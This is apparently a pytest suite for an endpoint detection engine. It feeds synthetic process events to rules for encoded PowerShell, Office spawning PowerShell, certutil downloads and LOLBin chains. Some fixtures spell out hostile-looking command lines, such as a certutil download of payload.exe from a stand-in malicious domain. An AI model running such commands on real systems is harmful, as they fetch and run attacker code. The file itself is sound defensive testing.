import time
import pytest
from app.services.telemetry.process_tree.builder import ProcessTreeBuilder
from app.services.detection.models import Detection, Severity
from app.services.detection.registry import DetectionRegistry
from app.services.detection.engine import DetectionEngine
from app.services.detection.rules.base import DetectionRule


def test_powershell_encoded_rule():
    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "powershell.exe",
                "cmdline": ["powershell.exe", "-enc", "encoded_payload"],
                "create_time": 100.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1001,
                "ppid": 0,
                "process_name": "powershell.exe",
                "cmdline": ["powershell.exe", "-EncodedCommand", "encoded_payload"],
                "create_time": 101.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1002,
                "ppid": 0,
                "process_name": "powershell.exe",
                "cmdline": ["powershell.exe", "-otherflag"],
                "create_time": 102.0,
            },
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)

    # Filter for powershell_encoded detections
    ps_enc_dets = [d for d in detections if d.rule_id == "powershell_encoded"]

    assert len(ps_enc_dets) == 2
    # Verify properties
    assert ps_enc_dets[0].severity == Severity.HIGH
    assert ps_enc_dets[0].confidence == 95
    assert ps_enc_dets[0].mitre_technique == "T1059"
    assert "powershell.exe" in ps_enc_dets[0].metadata["matched_processes"]
    assert "-enc" in ps_enc_dets[0].metadata["matched_keywords"] or "-EncodedCommand" in ps_enc_dets[0].metadata["matched_keywords"]


def test_powershell_spawning_cmd_rule():
    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "powershell.exe",
                "create_time": 100.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 2000,
                "ppid": 1000,
                "process_name": "cmd.exe",
                "create_time": 101.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 3000,
                "ppid": 0,
                "process_name": "cmd.exe",
                "create_time": 102.0,
            },
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)
    ps_cmd_dets = [d for d in detections if d.rule_id == "powershell_cmd"]

    assert len(ps_cmd_dets) == 1
    assert ps_cmd_dets[0].severity == Severity.MEDIUM
    assert ps_cmd_dets[0].confidence == 85
    assert ps_cmd_dets[0].mitre_technique == "T1059"
    # Verify evidence contains two processes (powershell and cmd)
    assert len(ps_cmd_dets[0].evidence) == 2
    p_names = [e["Process Name"] for e in ps_cmd_dets[0].evidence]
    assert "cmd.exe" in p_names
    assert "powershell.exe" in p_names


def test_office_spawning_powershell_rule():
    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "WINWORD.EXE",
                "create_time": 100.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 2000,
                "ppid": 1000,
                "process_name": "powershell.exe",
                "create_time": 101.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 3000,
                "ppid": 0,
                "process_name": "notepad.exe",
                "create_time": 102.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 4000,
                "ppid": 3000,
                "process_name": "powershell.exe",
                "create_time": 103.0,
            },
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)
    office_spawn_dets = [d for d in detections if d.rule_id == "office_spawn"]

    assert len(office_spawn_dets) == 1
    assert office_spawn_dets[0].severity == Severity.HIGH
    assert office_spawn_dets[0].confidence == 90
    assert office_spawn_dets[0].mitre_technique == "T1204"
    assert "WINWORD.EXE" in office_spawn_dets[0].metadata["matched_processes"]
    assert "powershell.exe" in office_spawn_dets[0].metadata["matched_processes"]


def test_certutil_download_rule():
    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "certutil.exe",
                "cmdline": ["certutil.exe", "-urlcache", "-split", "https://malicious.domain/payload.exe"],
                "create_time": 100.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1001,
                "ppid": 0,
                "process_name": "certutil.exe",
                "cmdline": ["certutil.exe", "-otherflag"],
                "create_time": 101.0,
            },
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)
    cert_dets = [d for d in detections if d.rule_id == "certutil_download"]

    assert len(cert_dets) == 1
    assert cert_dets[0].severity == Severity.HIGH
    assert cert_dets[0].confidence == 95
    assert cert_dets[0].mitre_technique == "T1105"
    assert "-urlcache" in cert_dets[0].metadata["matched_keywords"]
    assert "-split" in cert_dets[0].metadata["matched_keywords"]


def test_suspicious_lolbins_rule():
    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "mshta.exe",
                "create_time": 100.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1001,
                "ppid": 0,
                "process_name": "rundll32.exe",
                "create_time": 101.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1002,
                "ppid": 0,
                "process_name": "notepad.exe",
                "create_time": 102.0,
            },
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)
    lol_dets = [d for d in detections if d.rule_id == "suspicious_lolbins"]

    assert len(lol_dets) == 2
    proc_names = {d.metadata["matched_processes"][0].lower() for d in lol_dets}
    assert proc_names == {"mshta.exe", "rundll32.exe"}


def test_lolbin_chain_rule():
    # Chain: mshta.exe -> powershell.exe -> cmd.exe -> certutil.exe
    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "mshta.exe",
                "create_time": 100.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 2000,
                "ppid": 1000,
                "process_name": "powershell.exe",
                "create_time": 101.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 3000,
                "ppid": 2000,
                "process_name": "cmd.exe",
                "create_time": 102.0,
            },
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 4000,
                "ppid": 3000,
                "process_name": "certutil.exe",
                "create_time": 103.0,
            },
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)
    chain_dets = [d for d in detections if d.rule_id == "lolbin_chain"]

    assert len(chain_dets) == 1
    assert chain_dets[0].severity == Severity.CRITICAL
    assert chain_dets[0].confidence == 98
    assert chain_dets[0].mitre_technique == "T1218"
    assert "certutil.exe" in chain_dets[0].metadata["matched_processes"]
    assert "mshta.exe" in chain_dets[0].metadata["matched_processes"]
    # Verify parent evidence list contains both MSHTA and Certutil details
    p_names = [e["Process Name"] for e in chain_dets[0].evidence]
    assert "certutil.exe" in p_names
    assert "mshta.exe" in p_names


def test_engine_duplicate_suppression():
    # If the registry has two rules returning identical detections
    # (Here we mock this by registering the same rule instance twice, or registering a custom rule)
    class FakeRule(DetectionRule):
        @property
        def id(self) -> str:
            return "fake_rule"
        @property
        def name(self) -> str:
            return "Fake Rule"
        @property
        def description(self) -> str:
            return "Fake description"
        @property
        def severity(self) -> str:
            return Severity.LOW
        @property
        def mitre_technique(self) -> str:
            return "T1000"
        @property
        def mitre_tactic(self) -> str:
            return "Initial Access"
        @property
        def confidence(self) -> int:
            return 50
        @property
        def recommendations(self) -> list[str]:
            return []
        @property
        def tags(self) -> list[str]:
            return []

        def evaluate(self, tree):
            # Returns the exact same detection every time
            node = list(tree.nodes_by_guid.values())[0]
            det = self._create_detection(node, tree.host_id, [], [], [])
            return [det, det]  # Return two identical detections

    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {
                "pid": 1000,
                "ppid": 0,
                "process_name": "cmd.exe",
                "create_time": 100.0,
            },
        }
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    # Register fake rule
    fake_rule = FakeRule()
    DetectionRegistry.register(fake_rule)

    try:
        detections = DetectionEngine.evaluate(tree)
        fake_dets = [d for d in detections if d.rule_id == "fake_rule"]
        # Duplicate suppression should reduce the output list to 1 fake detection
        assert len(fake_dets) == 1
    finally:
        # Cleanup registry
        DetectionRegistry._rules = [r for r in DetectionRegistry._rules if r.id != "fake_rule"]


def test_engine_sorting_precedence():
    # Generate multiple processes to trigger LOW, MEDIUM, HIGH, CRITICAL detections
    events = [
        # LOLBin (MEDIUM)
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {"pid": 1000, "ppid": 0, "process_name": "mshta.exe", "create_time": 100.0},
        },
        # Office -> PowerShell (HIGH)
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {"pid": 2000, "ppid": 0, "process_name": "WINWORD.EXE", "create_time": 101.0},
        },
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {"pid": 2001, "ppid": 2000, "process_name": "powershell.exe", "create_time": 102.0},
        },
        # MSHTA -> Certutil chain (CRITICAL)
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {"pid": 3000, "ppid": 1000, "process_name": "certutil.exe", "create_time": 103.0},
        },
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    detections = DetectionEngine.evaluate(tree)

    # We should have CRITICAL first, then HIGH, then MEDIUM
    assert len(detections) >= 3
    assert detections[0].severity == Severity.CRITICAL
    assert detections[1].severity == Severity.HIGH

    # Verify sorting key comparison:
    # 1st is CRITICAL (lolbin_chain)
    # 2nd is HIGH (office_spawn or certutil_download or powershell_encoded)
    # 3rd is MEDIUM (suspicious_lolbins)
    severities = [d.severity for d in detections]
    # Check that CRITICAL precedes HIGH, and HIGH precedes MEDIUM/LOW
    critical_indices = [i for i, sev in enumerate(severities) if sev == Severity.CRITICAL]
    high_indices = [i for i, sev in enumerate(severities) if sev == Severity.HIGH]
    medium_indices = [i for i, sev in enumerate(severities) if sev == Severity.MEDIUM]

    for c in critical_indices:
        for h in high_indices:
            assert c < h
    for h in high_indices:
        for m in medium_indices:
            assert h < m


def test_fault_tolerance():
    class BrokenRule(DetectionRule):
        @property
        def id(self) -> str:
            return "broken_rule"
        @property
        def name(self) -> str:
            return "Broken Rule"
        @property
        def description(self) -> str:
            return "Always raises an exception"
        @property
        def severity(self) -> str:
            return Severity.LOW
        @property
        def mitre_technique(self) -> str:
            return "T0000"
        @property
        def mitre_tactic(self) -> str:
            return "Execution"
        @property
        def confidence(self) -> int:
            return 10
        @property
        def recommendations(self) -> list[str]:
            return []
        @property
        def tags(self) -> list[str]:
            return []

        def evaluate(self, tree):
            raise RuntimeError("Something went wrong!")

    events = [
        {
            "host_id": "host-1",
            "event_type": "process_start",
            "data": {"pid": 1000, "ppid": 0, "process_name": "mshta.exe", "create_time": 100.0},
        }
    ]

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-1"]

    broken_rule = BrokenRule()
    DetectionRegistry.register(broken_rule)

    try:
        # Engine should run successfully despite BrokenRule throwing an exception
        detections = DetectionEngine.evaluate(tree)
        # Should still output the suspicious lolbin alert for mshta.exe
        assert len(detections) > 0
    finally:
        DetectionRegistry._rules = [r for r in DetectionRegistry._rules if r.id != "broken_rule"]


def test_performance_benchmark():
    # Build a scale tree with 10,000 nodes
    # We will simulate parent-child relationships in chains to trigger rule matching but keep traversal fast.
    events = []
    for i in range(10000):
        # We spawn a variety of processes: explorer, cmd, powershell, certutil, and normal ones
        proc_name = "normal.exe"
        cmdline = ["normal.exe"]
        if i % 100 == 0:
            proc_name = "powershell.exe"
            cmdline = ["powershell.exe", "-enc", "payload"]
        elif i % 100 == 1:
            proc_name = "cmd.exe"
            cmdline = ["cmd.exe"]
        elif i % 100 == 2:
            proc_name = "certutil.exe"
            cmdline = ["certutil.exe", "-urlcache", "-split", "https://malicious/path"]
        elif i % 100 == 3:
            proc_name = "mshta.exe"

        events.append(
            {
                "host_id": "host-perf",
                "event_type": "process_start",
                "data": {
                    "pid": i + 1,
                    "ppid": i if i > 0 else 0,
                    "process_name": proc_name,
                    "cmdline": cmdline,
                    "create_time": float(i),
                },
            }
        )

    trees = ProcessTreeBuilder.build(events)
    tree = trees["host-perf"]

    start_time = time.perf_counter()
    detections = DetectionEngine.evaluate(tree)
    elapsed_ms = (time.perf_counter() - start_time) * 1000.0

    print(f"\n[BENCHMARK] Evaluated 10,000 process tree nodes in {elapsed_ms:.2f} ms")
    print(f"[BENCHMARK] Total detections found: {len(detections)}")

    # Target is under 150 ms
    assert elapsed_ms < 150.0, f"Performance budget exceeded: {elapsed_ms:.2f} ms > 150 ms"
